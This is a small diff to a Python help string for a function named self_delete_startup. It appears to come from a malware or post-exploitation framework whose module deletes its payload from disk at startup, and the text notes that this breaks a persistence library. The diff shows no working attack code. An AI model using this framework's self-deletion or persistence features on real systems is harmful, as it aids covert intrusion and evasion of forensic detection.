@@ -19,4 +19,4 @@ def self_delete_startup():
               '\nRequired Modules : os, sys' \
               '\nCommands         : NIL (Runs at startup)' \
               '\nDescription      : Deletes the payload off the disk' \
-              '\nNote             : Persistence library will NOT work due to the file being deleted off of disk'
+              '\nNote             : Persistence library will NOT work due to the file being deleted off of disk\n'
